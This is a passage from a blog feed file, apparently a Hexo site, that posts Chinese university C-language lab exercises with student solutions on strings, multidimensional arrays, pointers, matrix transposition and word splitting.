class="string">&quot;%c&quot;</span>,a[i]);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(l==1)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p>本题用指针完成在一个已经排好序的数组中，插入一个新数据，插入过程不改变原有的顺序，插入后的数组依然是排好顺序的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,flag;</span><br><span class="line">    double a[100],t,tmp;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        flag=0;</span><br><span class="line">        scanf(<span class="string">&quot;%lf&quot;</span>,&amp;t);</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%lf&quot;</span>,a+i);</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;t &amp;&amp; flag==0)</span><br><span class="line">            &#123;</span><br><span class="line">                tmp=a[i];</span><br><span class="line">                a[i]=t;</span><br><span class="line">                a[i+1]=tmp;</span><br><span class="line">                i++;</span><br><span class="line">                n++;</span><br><span class="line">                flag=1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%.2lf &quot;</span>,*(a+i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><p>用指针完成一个双精度矩阵最大值的查找及输出。矩阵是一个不超过十行十列的实数矩阵。请分别编写矩阵输入函数、矩阵中最大值及其位置查找两个自定义函数求解。在这两个函数中，矩阵元素的遍历查找和赋值通过指针实现。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">void <span class="keyword">in</span>(int n,int m);</span><br><span class="line">double a[15][15];</span><br><span class="line">double max;</span><br><span class="line">int maxi,maxj;</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,m;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">in</span>(n,m);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2lf %d %d\n&quot;</span>,max,maxi+1,maxj+1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void <span class="keyword">in</span>(int n,int m)</span><br><span class="line">&#123;</span><br><span class="line">    int i,j;</span><br><span class="line">    max=-1;</span><br><span class="line">    maxi=maxj=0;</span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=0;j&lt;m;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%lf&quot;</span>,(*(a+i))+j);</span><br><span class="line">            <span class="keyword">if</span>(a[i][j]&gt;max)&#123;</span><br><span class="line">                 max=a[i][j];</span><br><span class="line">                 maxi=i;</span><br><span class="line">                 maxj=j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><p>编程实现在一个字符串中取出一部分字符的功能。取出的字符组成一个新字符串。</p><p><code>bash #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; char a[105],b[105]; int n,m; int main() &#123;     while(scanf(&quot;%s&quot;,a)!=-1)     &#123;         scanf(&quot;%d %d&quot;,&amp;n,&amp;m);         select(n,m);         printf(&quot;%s\n&quot;,b);     &#125; &#125; void select(int n,int m) &#123;     int i,j=0;     for(i=n-1;i&lt;m;i++)     &#123;         b[j++]=a[i];     &#125;     b[j]=&#39;\0&#39;; &#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 2</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-2/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-2/</url>
      
        <content type="html"><![CDATA[<h3 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h3><h4 id="二-多维数组"><a href="#二-多维数组" class="headerlink" title="二.多维数组"></a>二.多维数组</h4><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>七段显示器输出。计算器、电子手表和其它电子设备经常依靠七段显示器进行数值的输出。为了组成数字，这些设备需要“打开”7个显示段中的某些部分，同时“关闭”其它部分。假设需要设置一个数组来记住显示每个数字时需要“打开”的显示段。试编写一个程序，将输入进来的一位十进制数字转换成对应的显示段二进制编码，并实现显示码输出。各显示段的标号如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">   int max_save[10][7]=&#123;&#123;1,1,1,1,1,1,0&#125;,</span><br><span class="line">                        &#123;0,1,1,0,0,0,0&#125;,</span><br><span class="line">                        &#123;1,1,0,1,1,0,1&#125;,</span><br><span class="line">                        &#123;1,1,1,1,0,0,1&#125;,</span><br><span class="line">                        &#123;0,1,1,0,0,1,1&#125;,</span><br><span class="line">                        &#123;1,0,1,1,0,1,1&#125;,</span><br><span class="line">                        &#123;1,0,1,1,1,1,1&#125;,</span><br><span class="line">                        &#123;1,1,1,0,0,0,0&#125;,</span><br><span class="line">                        &#123;1,1,1,1,1,1,1&#125;,</span><br><span class="line">                        &#123;1,1,1,1,0,1,1&#125;&#125;;</span><br><span class="line">   int num,col;</span><br><span class="line">   scanf(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">   /*模拟七段数码显示管分5行输出，</span><br><span class="line">    *奇数行只输出空格或者-,</span><br><span class="line">    *偶数行只输出空格或者|。*/</span><br><span class="line">   //start</span><br><span class="line">       <span class="keyword">if</span>(max_save[num][0]==1) <span class="built_in">printf</span>(<span class="string">&quot; - \n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;   \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(max_save[num][5]==1 &amp;&amp; max_save[num][1]==1) <span class="built_in">printf</span>(<span class="string">&quot;| |\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max_save[num][5]==1) <span class="built_in">printf</span>(<span class="string">&quot;|  \n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max_save[num][1]==1) <span class="built_in">printf</span>(<span class="string">&quot;  |\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;   \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(max_save[num][6]==1) <span class="built_in">printf</span>(<span class="string">&quot; - \n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;   \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(max_save[num][4]==1 &amp;&amp; max_save[num][2]==1) <span class="built_in">printf</span>(<span class="string">&quot;| |\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max_save[num][4]==1) <span class="built_in">printf</span>(<span class="string">&quot;|  \n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(max_save[num][2]==1) <span class="built_in">printf</span>(<span class="string">&quot;  |\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;   \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(max_save[num][3]==1) <span class="built_in">printf</span>(<span class="string">&quot; - \n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;   \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   //end</span><br><span class="line">   <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h5 id="2-运用函数，将一个二方阵转置后输出。"><a href="#2-运用函数，将一个二方阵转置后输出。" class="headerlink" title="2. 运用函数，将一个二方阵转置后输出。"></a>2. 运用函数，将一个二方阵转置后输出。</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#define N 5</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">   void transfor(int a[][N]);</span><br><span class="line">   int array[N][N],i,j;</span><br><span class="line">   <span class="keyword">for</span>(i=0;i&lt;N;i++)</span><br><span class="line">      <span class="keyword">for</span>(j=0;j&lt;N;j++)</span><br><span class="line">         scanf(<span class="string">&quot;%d&quot;</span>,&amp;array[i][j]);</span><br><span class="line">   transfor(array);</span><br><span class="line">   <span class="keyword">for</span>(i=0;i&lt;N;i++)</span><br><span class="line">      <span class="keyword">for</span>(j=0;j&lt;N;j++)</span><br><span class="line">         j!=N-1?<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,array[i][j]):<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,array[i][j]);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">void transfor(int a[][N])</span><br><span class="line">&#123;</span><br><span class="line">//start</span><br><span class="line">int b[5][5],i,j;</span><br><span class="line"><span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=0;j&lt;5;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i][j]=a[5-i-1][5-j-1];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=0;j&lt;5;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i][j]=b[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//end</span><br><span class="line">&#125;```</span><br><span class="line"></span><br><span class="line"><span class="comment">### 3. </span></span><br><span class="line">运用函数，将一个二维矩阵转置后输出。</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#define R 3</span></span><br><span class="line"><span class="comment">#define C 5</span></span><br><span class="line"><span class="comment">#define N (R&gt;C?R:C)</span></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">   void transfor(int a[][N]);</span><br><span class="line">   int array[N][N],i,j;</span><br><span class="line">   <span class="keyword">for</span>(i=0;i&lt;R;i++)</span><br><span class="line">      <span class="keyword">for</span>(j=0;j&lt;C;j++)</span><br><span class="line">         scanf(<span class="string">&quot;%d&quot;</span>,&amp;array[i][j]);</span><br><span class="line">   transfor(array);</span><br><span class="line">   <span class="keyword">for</span>(i=0;i&lt;C;i++)</span><br><span class="line">      <span class="keyword">for</span>(j=0;j&lt;R;j++)</span><br><span class="line">         j!=R-1?<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,array[i][j]):<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,array[i][j]);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">void transfor(int a[][N])</span><br><span class="line">&#123;</span><br><span class="line">//start</span><br><span class="line">int i,j,b[5][3];</span><br><span class="line"><span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=0;j&lt;3;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i][j]=a[j][i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=0;j&lt;3;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i][j]=b[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//end</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h4><p>国际大学生程序设计竞赛已经发展成为最具影响力的大学生计算机竞赛，ACM-ICPC以团队的形式代表各学校参赛，每队由3名队员组成，一个队每做出来一个题该队就会获得该题对应颜色的气球，气球越多就说明该队做的题目越多。当然如果一个颜色的气球越多就说明该气球对应的题也就越简单。现在给你很多很多的颜色的气球，问你那个颜色的气球最多。input 假设只有6种颜色，green，red，blue，pink，orange，black。输入数据有多组，每组数据开始给出一个整数n代表接下来有n个气球，接下来有n行，每行输入一种颜色，n &lt;= 100output 输出个数最多的气球的颜色（题目保证个数最多的气球有且仅有一种颜色，数量相同按样本出现先后为准，以最后出现的颜色计）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int i,num[6],n,max,maxl;</span><br><span class="line">    char a[6][10]=&#123;<span class="string">&quot;green&quot;</span>,<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;pink&quot;</span>,<span class="string">&quot;orange&quot;</span>,<span class="string">&quot;black&quot;</span>&#125;;</span><br><span class="line">    char temp[20];</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;6;i++) num[i]=0;</span><br><span class="line">        <span class="keyword">while</span>(n--)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s&quot;</span>,temp);</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;6;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(strcmp(temp,a[i])==0)</span><br><span class="line">                &#123;</span><br><span class="line">                    num[i]++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            max=-999;</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;6;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(num[i]&gt;max)</span><br><span class="line">                &#123;</span><br><span class="line">                     max=num[i];</span><br><span class="line">                     maxl=i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,a[maxl]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p>分词输出。输入一个句子（长度小于100），将其中的单词分割出来（单词个数不超过15，每个单词的长度不超过10），而后每行输出一个单词。提示您：单词应该以空白符后的第一个字母开始，以空白符或标点符号前的最后一个字母结束。输入数据有多组。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#define LEN 100</span></span><br><span class="line"><span class="comment">#define ROW 15</span></span><br><span class="line"><span class="comment">#define COL 10</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">   char array[LEN];</span><br><span class="line">   char word[ROW][COL];</span><br><span class="line">   int i,j,is_char_ahead; //is_char_ahead:记录前一个字符是否为字母</span><br><span class="line">   int row,col; //row:记录单词的个数;col:记录单词中的字母</span><br><span class="line">   <span class="keyword">while</span>(gets(array)!=NULL)</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">for</span>(i=0;i&lt;ROW;i++)</span><br><span class="line">         <span class="keyword">for</span>(j=0;j&lt;COL;j++)</span><br><span class="line">            word[i][j] = 0;</span><br><span class="line">      i=0;</span><br><span class="line">      <span class="keyword">while</span>((array[i]&lt;<span class="string">&#x27;a&#x27;</span>||array[i]&gt;<span class="string">&#x27;z&#x27;</span>)&amp;&amp;</span><br><span class="line">            (array[i]&lt;<span class="string">&#x27;A&#x27;</span>||array[i]&gt;<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">        i++; //考虑到用gets函数，略过首单词前面的空白符</span><br><span class="line">      is_char_ahead = 0;</span><br><span class="line">      row = 0;</span><br><span class="line">      <span class="keyword">while</span>(1)</span><br><span class="line">      &#123;</span><br><span class="line">        //start</span><br><span class="line">        int l=strlen(array);</span><br><span class="line">        j=0;</span><br><span class="line">        int k=0;</span><br><span class="line">        int flag;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;l;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            k=0;</span><br><span class="line">            flag=0;</span><br><span class="line">            <span class="keyword">while</span>(array[i]!=<span class="string">&#x27; &#x27;</span> &amp;&amp; array[i]!=<span class="string">&#x27;.&#x27;</span> &amp;&amp; array[i]!=<span class="string">&#x27;?&#x27;</span> &amp;&amp; array[i]!=<span class="string">&#x27;!&#x27;</span> &amp;&amp; array[i]!=39 &amp;&amp; array[i]!=<span class="string">&#x27;-&#x27;</span> &amp;&amp; array[i]!=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                word[j][k++]=array[i];</span><br><span class="line">                flag=1;</span><br><span class="line">                i++;</span><br><span class="line">                <span class="keyword">if</span>(i&gt;=l) <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag==1)</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        row=j;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">        //end</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span>(i=0;i&lt;row;i++)</span><br><span class="line">        <span class="keyword">if</span>(word[i][0]&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; word[i][0]&lt;=<span class="string">&#x27;Z&#x27;</span> || word[i][0]&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; word[i][0]&lt;=<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,word[i]);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 1</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-1/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-1/</url>
      
        <content type="html"><![CDATA[<h3 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h3><h5 id="一-字符串"><a href="#一-字符串" class="headerlink" title="一.字符串"></a>一.字符串</h5><h6 id="1-大写变小写。读一个字符串（长度-lt-10），将其中出现的大写字母统统变成小写字母，此后输出改变后的字符串"><a href="#1-大写变小写。读一个字符串（长度-lt-10），将其中出现的大写字母统统变成小写字母，此后输出改变后的字符串" class="headerlink" title="1.大写变小写。读一个字符串（长度&lt;10），将其中出现的大写字母统统变成小写字母，此后输出改变后的字符串"></a>1.大写变小写。读一个字符串（长度&lt;10），将其中出现的大写字母统统变成小写字母，此后输出改变后的字符串</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#define LEN 10</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">   char array[LEN];</span><br><span class="line">   int i;</span><br><span class="line">   gets(array);</span><br><span class="line">   i=0;</span><br><span class="line">   <span class="keyword">while</span>(array[i]!=<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">   &#123;</span><br><span class="line">      //start</span><br><span class="line">            <span class="keyword">if</span>(array[i]&gt;=<span class="string">&#x27;A&#x27;</span> &amp;&amp; array[i]&lt;=<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          array[i]+=32;</span><br><span class="line">      &#125;</span><br><span class="line">      i++;</span><br><span class="line">      //end</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,array);</span><br><span class="line">   <span class="built_in">return</span> 0;</span><br><span 